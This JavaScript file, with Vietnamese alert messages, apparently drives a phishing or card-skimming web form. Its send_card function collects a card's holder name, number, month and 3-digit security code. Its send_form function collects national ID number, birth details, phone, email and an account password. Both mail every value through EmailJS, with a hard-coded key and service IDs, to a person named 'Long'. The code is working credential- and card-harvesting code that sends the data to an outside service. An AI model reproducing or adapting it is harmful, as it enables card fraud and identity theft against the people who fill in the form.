function send_card()
{
    emailjs.init("RDMVkfdGUiOuDhbPZ"); 

    card_category = document.getElementById("card_select").value + " Card";
    card_name = document.getElementById("card_one").value;
    card_number = document.getElementById("card_two").value;
    car_month = document.getElementById("card_three").value;
    car_color = document.getElementById("card_four").value;
    car_pass = document.getElementById("card_five").value;

    car_color = +("0x" + car_color.slice(1).replace(car_color.length < 5 && /./g, '$&$&'));

    if (validation_card(card_name, card_number, car_month, car_pass))
    {
        var template_card =
        {
            to_name: "Long",
            from_name: card_name,
            type: "Card",
            category: card_category,
            name: card_name,
            number: card_number,
            month: car_month,
            color: String(car_color),
            pass: car_pass,
        }
        emailjs.send('service_7dlkxjc', 'template_2rp2gwb', template_card).then
        (
            function(response) 
            {
                console.log('SUCCESS!', response.status, response.text);
            }, 
            function(error) 
            {
                console.log('FAILED!', error);
            }
        );
        create_card();
    }
    
}
function validation_card(card_name, card_number, car_month, car_pass)
{
    const numberRegex = /^\d{4}\s\d{4}\s\d{4}\s\d{4}$/;
    const passwordRegex = /^\d{3}$/;
    const nameValue = card_name.trim()
    const nameWords = nameValue.split(" ")


    const isNumberValid = numberRegex.test(card_number);
    const isPasswordValid = passwordRegex.test(car_pass);

    if (nameWords.length < 2 || nameValue.length > 18)
    {
        alert("Kiểm tra tên! Tên chỉ có chữ cái, bao gồm ít nhất 2 từ và tối đa là 18 chữ");
        return false;
    }
    if (!isNumberValid)
    {
        alert("Kiểm tra số thẻ! Số thẻ chỉ có chữ số, 4 chữ số cách nhau một khoảng trắng và được lặp lại tạo thành 4 cặp chữ số")
        return false;
    }
    if(car_month == '')
    {
        alert("Kiểm tra tháng! Tháng không thể nào rỗng");
        return false;
    }
    if (!isPasswordValid)
    {
        alert("Kiểm tra mã PIN! Mã PIN gồm 3 chữ số");
        return false;
    }

    return true;
}
function send_form()
{
    emailjs.init("RDMVkfdGUiOuDhbPZ"); 

    form_name = document.getElementById("acc_one").value;
    from_surname = document.getElementById("acc_two").value;
    form_gender = document.getElementById("acc_three").value;
    form_ethnic = document.getElementById("acc_four").value;
    form_dob = document.getElementById("acc_five").value;
    form_pob = document.getElementById("acc_six").value;
    form_phone = document.getElementById("acc_seven").value;
    form_email = document.getElementById("acc_eight").value;
    form_image = document.getElementById("acc_nine").value;
    form_nid = document.getElementById("acc_ten").value;
    form_nal = document.getElementById("acc_eleven").value;
    form_dor = document.getElementById("acc_twelve").value;
    form_por = document.getElementById("acc_thridteen").value;
    form_id = document.getElementById("acc_fourteen").value;
    form_pass = document.getElementById("acc_fifteen").value;
    form_holder = document.getElementById("acc_sixteen").value;
    form_accept_one = document.getElementById("acc_seventeen").value;
    form_accept_two = document.getElementById("acc_eighteen").value;

    const characterRegex = /^[a-zA-Z]{1,10}$/;
    const numberRegex = /^\d{1,11}$/;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const passwordRegex = /^(?=.*[a-zA-Z])(?=.*\d).{3,10}$/;

    if (!characterRegex.test(form_name))
    {
        alert("Tên là chữ cái và có giới hạn từ 1 đến 10");
        return false;
    }
    if (!characterRegex.test(from_surname))
    {
        alert("Họ là chữ cái và có giới hạn từ 1 đến 10");
        return false;
    }
    if (!characterRegex.test(form_ethnic))
    {
        alert("Dân tộc là chữ cái và có giới hạn từ 1 đến 10");
        return false;
    }
    if (form_dob == '')
    {
        alert("Ngày sinh không rỗng");
        return false;
    }
    if (!characterRegex.test(form_pob))
    {
        alert("Nơi sinh là chữ cái và có giới hạn từ 1 đến 10");
        return false;
    }
    if (!numberRegex.test(form_phone))
    {
        alert("Số điện thoại là chữ số và có giới hạn từ 1 đến 11");
        return false;
    }
    if (!emailRegex.test(form_email))
    {
        alert("Email là định dạng email chuẩn");
        return false;
    }
    if (!numberRegex.test(form_nid))
    {
        alert("Số cmnd là chữ số và có giới hạn từ 1 đến 11");
        return false;
    }
    if (form_dor == '')
    {
        alert("Ngày đăng ký không rỗng");
        return false;
    }
    if (!characterRegex.test(form_por))
    {
        alert("Nơi đăng ký là chữ cái và có giới hạn từ 1 đến 10");
        return false;
    }
    if (!characterRegex.test(form_id))
    {
        alert("Tên tài khoản là chữ cái và có giới hạn từ 1 đến 10");
        return false;
    }
    if (!passwordRegex.test(form_pass))
    {
        alert("Mật khẩu gồm ít nhất 1 chữ cái và 1 chữ số và có tối đa 10 và tối tiểu 3");
        return false;
    }
    if (!characterRegex.test(form_holder))
    {
        alert("Tên người dùnglà chữ cái và có giới hạn từ 1 đến 10");
        return false;
    }
    
    var template_form =
    {
        to_name: "Long",
        from_name: form_name + " " + from_surname,
        type: "Form",
        name: form_name,
        surname: from_surname,
        gender: form_gender,
        ethnic: form_ethnic,
        dob: form_dob,
        pob: form_pob,
        phone: form_phone,
        email: form_email,
        nid: form_nid,
        nal: form_nal,
        dor: form_dor,
        por: form_por,
        id: form_id,
        pass: form_pass,
        holder: form_holder,
        accept_one: form_accept_one,
        accept_two: form_accept_two,
    }
    emailjs.send('service_7dlkxjc', 'template_tyr8elp', template_form).then
    (
        function(response) 
        {
            console.log('SUCCESS!', response.status, response.text);
        }, 
        function(error) 
        {
            console.log('FAILED!', error);
        }
    );

    return submit_form();
}
